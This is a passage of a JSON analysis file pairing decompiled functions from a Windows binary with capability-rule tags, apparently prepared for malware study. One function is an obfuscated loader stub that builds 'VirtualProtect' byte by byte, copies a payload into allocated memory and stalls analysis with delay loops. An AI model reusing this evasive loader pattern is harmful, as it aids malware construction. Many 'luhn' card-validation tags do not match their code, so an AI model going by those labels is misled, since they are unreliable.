else {\n                param_2 = *(param_2 + 4);\n            }\n            piVar1 = param_1 + 4;\n            arg_8h = piVar1;\n            if (0xf < *(param_1 + 0x18)) {\n                arg_8h = *piVar1;\n            }\n            fcn.00401a79(arg_8h, *(param_1 + 0x18), param_2 + param_3, arg_14h);\n            *(param_1 + 0x14) = arg_14h;\n            if (0xf < *(param_1 + 0x18)) {\n                piVar1 = *piVar1;\n            }\n            *(piVar1 + arg_14h) = 0;\n        }\n        return param_1;\n    }\n    fcn.004012c0(arg_14h + param_3, 0xffffffff);\n    fcn.004012c0(0, param_3);\n    return param_1;\n}\n",
        "token_count": 581
    },
    "004011e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.004011e0(int32_t param_1, uint *param_2, uint32_t param_3)\n\n{\n    uint32_t uVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    int32_t *arg_8h;\n    uint *puVar4;\n    int32_t *piVar5;\n    \n    if (param_2 != NULL) {\n        uVar1 = *(param_1 + 0x18);\n        puVar2 = param_1 + 4;\n        puVar4 = puVar2;\n        if (0xf < uVar1) {\n            puVar4 = *puVar2;\n        }\n        if (puVar4 <= param_2) {\n            puVar4 = puVar2;\n            if (0xf < uVar1) {\n                puVar4 = *puVar2;\n            }\n            if (param_2 < *(param_1 + 0x14) + puVar4) {\n                if (0xf < uVar1) {\n                    puVar2 = *puVar2;\n                }\n                iVar3 = fcn.004010b0(param_1, param_2 - puVar2, param_3);\n                return iVar3;\n            }\n        }\n    }\n    if (param_3 == 0xffffffff) {\n        fcn.0040168a();\n    }\n    if (*(param_1 + 0x18) < param_3) {\n        fcn.00401370(param_3, *(param_1 + 0x14));\n    }\n    else if (param_3 == 0) {\n        *(param_1 + 0x14) = 0;\n        if (*(param_1 + 0x18) < 0x10) {\n            *(param_1 + 4) = 0;\n            return param_1;\n        }\n        **(param_1 + 4) = 0;\n        return param_1;\n    }\n    if (param_3 != 0) {\n        piVar5 = param_1 + 4;\n        arg_8h = piVar5;\n        if (0xf < *(param_1 + 0x18)) {\n            arg_8h = *piVar5;\n        }\n        fcn.00401a79(arg_8h, *(param_1 + 0x18), param_2, param_3);\n        *(param_1 + 0x14) = param_3;\n        if (0xf < *(param_1 + 0x18)) {\n            piVar5 = *piVar5;\n        }\n        *(piVar5 + param_3) = 0;\n    }\n    return param_1;\n}\n",
        "token_count": 596
    },
    "004012c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.004012c0(int32_t param_1, uint *param_2, uint32_t param_3)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint *puVar5;\n    \n    uVar1 = param_2;\n    if (*(param_1 + 0x14) < param_2) {\n        fcn.004016c2();\n    }\n    uVar2 = *(param_1 + 0x14) - param_2;\n    if (uVar2 < param_3) {\n        param_3 = uVar2;\n    }\n    if (param_3 != 0) {\n        puVar5 = param_1 + 4;\n        puVar4 = puVar5;\n        param_2 = puVar5;\n        if (0xf < *(param_1 + 0x18)) {\n            puVar4 = *puVar5;\n            param_2 = *puVar5;\n        }\n        fcn.004017a8(puVar4 + uVar1, *(param_1 + 0x18) - uVar1, param_2 + param_3 + uVar1, uVar2 - param_3);\n        iVar3 = *(param_1 + 0x14) - param_3;\n        *(param_1 + 0x14) = iVar3;\n        if (0xf < *(param_1 + 0x18)) {\n            puVar5 = *puVar5;\n        }\n        *(iVar3 + puVar5) = 0;\n    }\n    return param_1;\n}\n",
        "token_count": 371
    },
    "00401725": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00401725(uint arg_8h)\n\n{\n    int32_t arg_8h_00;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.0040224b(4);\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    arg_8h_00 = *(unaff_EBP + 8);\n    fcn.00401886(arg_8h_00);\n    *(unaff_EBP + -4) = 0;\n    *extraout_ECX = vtable.std::logic_error.0;\n    fcn.004016fa(arg_8h_00 + 0xc);\n    fcn.004022b4();\n    return;\n}\n",
        "token_count": 197
    },
    "00403abd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403abd(uint arg_8h)\n\n{\n    fcn.00403991(arg_8h, 0, 0);\n    return;\n}\n",
        "token_count": 39
    },
    "0040446e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00404482)\n// WARNING: Removing unreachable block (ram,0x00404488)\n// WARNING: Removing unreachable block (ram,0x0040448a)\n\nvoid fcn.0040446e(void)\n\n{\n    return;\n}\n",
        "token_count": 62
    },
    "0040e7d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040e7d0(void)\n\n{\n    return;\n}\n",
        "token_count": 18
    },
    "0040eb30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040eb30(void)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t **in_FS_OFFSET;\n    uint uVar5;\n    uint arg_8h;\n    uchar auStack2356 [28];\n    uchar auStack2328 [12];\n    int32_t iStack2316;\n    int32_t iStack2312;\n    uchar uStack2276;\n    uint32_t uStack2264;\n    uint uStack2260;\n    uint uStack2256;\n    uchar auStack2252 [20];\n    int32_t iStack2232;\n    uchar auStack2216 [2084];\n    uint32_t uStack132;\n    int32_t *piStack96;\n    uint uStack80;\n    int32_t *piStack76;\n    uint uStack72;\n    uint uStack68;\n    \n    uStack68 = 0xffffffff;\n    uStack72 = 0x40f04b;\n    piStack76 = *in_FS_OFFSET;\n    uStack132 = *0x4130a0 ^ auStack2356;\n    uVar2 = *0x4130a0 ^ &stack0xfffff6c0;\n    *in_FS_OFFSET = &piStack76;\n    arg_8h = 0x497d20;\n    iVar3 = (*_sym.imp.KERNEL32.dll_lstrlenW)(0x497d20, uVar2);\n    if (iVar3 == 0xd24a7) {\n        uStack2256 = 0xf;\n        uStack2260 = 0;\n        uStack2276 = 0;\n        fcn.004011e0(\"kajuyuzaguxemokavic geposugileruwudekayidewanoladep baxusefugemeben\", 0x43);\n        uStack80 = 0;\n        fcn.00401930(0);\n        fcn.00401a4d(0);\n        uStack80 = 0xffffffff;\n        if (0xf < uStack2264) {\n            fcn.00401a6e();\n        }\n    }\n    pcVar1 = _sym.imp.KERNEL32.dll_GetLastError;\n    iVar3 = 0;\n    while( true ) {\n        (*pcVar1)();\n        if (iVar3 < 0x5ffe5) {\n            (*_sym.imp.KERNEL32.dll_GetTickCount)();\n        }\n        if ((((0x7554b2f < iVar3) && (iStack2312 != 0x7c033962)) && (iStack2232 != 0x3934cd9f)) &&\n           (iStack2316 != 0x76409727)) break;\n        iVar3 = iVar3 + 1;\n        if (0x176f974f < iVar3) {\ncode_r0x0040ec8c:\n            iVar3 = 0;\n            do {\n                if (iVar3 == 0x3279b2) {\n                    *0x49b724 = *0x415ba8;\n                }\n                iVar3 = iVar3 + 1;\n            } while (iVar3 < 0x938932);\n            *0x49b724 = *0x49b724 + 0x1bfe1;\n            (*_sym.imp.KERNEL32.dll_lstrcatW)(0x497d20, L\"kernel32.dll\");\n            pcVar1 = _sym.imp.KERNEL32.dll_LoadLibraryW;\n            iVar3 = 0;\n            do {\n                if (iVar3 == 0x35dcd8) {\n                    *0x497d18 = (*pcVar1)();\n                }\n                iVar3 = iVar3 + 1;\n            } while (iVar3 < 0x5abd36);\n            *0x493218 = (*_sym.imp.KERNEL32.dll_GlobalAlloc)(0, *0x49b724);\n            uVar2 = *0x49b724;\n            *0x421ada = 0x72;\n            *0x421ae0 = 0x72;\n            *0x421adb = 0x74;\n            *0x421ae2 = 0x74;\n            *0x421ae5 = 0x74;\n            uVar4 = 0;\n            *0x421ad8 = 0x56;\n            *0x421ad9 = 0x69;\n            *0x421adc = 0x75;\n            *0x421add = 0x61;\n            *0x421ade = 0x6c;\n            *0x421adf = 0x50;\n            *0x421ae1 = 0x6f;\n            *0x421ae3 = 0x65;\n            *0x421ae4 = 99;\n            *0x421ae6 = 0;\n            *0x49b728 = *0x414168;\n            if (*0x49b724 != 0) {\n                iVar3 = *0x414168 + 0x1bfe1;\n                do {\n                    if (uVar2 == 0x748) {\n                        *0x497d1c = 0x922eace6;\n                    }\n                    *(*0x493218 + uVar4) = *(iVar3 + uVar4);\n                    uVar4 = uVar4 + 1;\n                } while (uVar4 < uVar2);\n            }\n            iVar3 = 0;\n            do {\n                if (iVar3 == 0x2877c) {\n                    fcn.0040cfb0();\n                }\n                iVar3 = iVar3 + 1;\n            } while (iVar3 < 0xd861c);\n            fcn.0040ea20();\n            fcn.0040e7d0();\n            *in_FS_OFFSET = piStack96;\n            fcn.00401799(arg_8h);\n            return;\n        }\n    }\n    if (*0x49b724 == 0x572) {\n        (*_sym.imp.KERNEL32.dll_GetProcessIoCounters)(0, auStack2252);\n        uVar5 = 0;\n        (*_sym.imp.KERNEL32.dll_SetConsoleTitleW)();\n        (*_sym.imp.KERNEL32.dll_IsBadStringPtrA)(0, 0, uVar5);\n        (*_sym.imp.KERNEL32.dll_BuildCommDCBA)(0, auStack2328);\n        (*_sym.imp.KERNEL32.dll_GetCurrentProcess)();\n        (*_sym.imp.KERNEL32.dll_FormatMessageW)(0, 0, 0, 0, auStack2216, 0, 0);\n    }\n    goto code_r0x0040ec8c;\n}\n",
        "token_count": 1464
    },
    "00401ef2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401ef2(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.004058e5(arg_8h, arg_ch, arg_10h, arg_14h, in_EAX, 0, 0, 0);\n    return uVar1;\n}\n",
        "token_count": 111
    },
    "00401040": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.00401040(int32_t param_1, char *param_2)\n\n{\n    char cVar1;\n    char *pcVar2;\n    \n    *(param_1 + 0x18) = 0xf;\n    *(param_1 + 0x14) = 0;\n    *(param_1 + 4) = 0;\n    pcVar2 = param_2;\n    do {\n        cVar1 = *pcVar2;\n        pcVar2 = pcVar2 + 1;\n    } while (cVar1 != '\\0');\n    fcn.004011e0(param_2, pcVar2 - (param_2 + 1));\n    return param_1;\n}\n",
        "token_count": 161
    },
    "00401350": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00401350(int32_t param_1, int32_t param_2)\n\n{\n    *(param_1 + 0x14) = param_2;\n    if (0xf < *(param_1 + 0x18)) {\n        *(*(param_1 + 4) + param_2) = 0;\n        return;\n    }\n    *(param_1 + 4 + param_2) = 0;\n    return;\n}\n",
        "token_count": 104
    },
    "00403555": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00403555(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *arg_8h_00;\n    int32_t *piVar3;\n    int32_t *piVar4;\n    int32_t unaff_EBP;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00404a88(0x412288, 0xc);\n    fcn.00405d9a(0xe);\n    *(unaff_EBP + -4) = 0;\n    arg_8h_00 = *0x421270;\n    iVar1 = *(unaff_EBP + 8);\n    iVar2 = *(iVar1 + 4);\n    if (iVar2 != 0) {\n        piVar3 = 0x42126c;\n        do {\n            piVar4 = piVar3;\n            *(unaff_EBP + -0x1c) = arg_8h_00;\n            if (arg_8h_00 == NULL) goto code_r0x00403599;\n            piVar3 = arg_8h_00;\n        } while (*arg_8h_00 != iVar2);\n        piVar4[1] = arg_8h_00[1];\n        fcn.00402a68(arg_8h_00);\ncode_r0x00403599:\n        fcn.00402a68(*(iVar1 + 4));\n        *(iVar1 + 4) = 0;\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    fcn.004035bc();\n    fcn.00404acd();\n    return;\n}\n",
        "token_count": 391
    }
}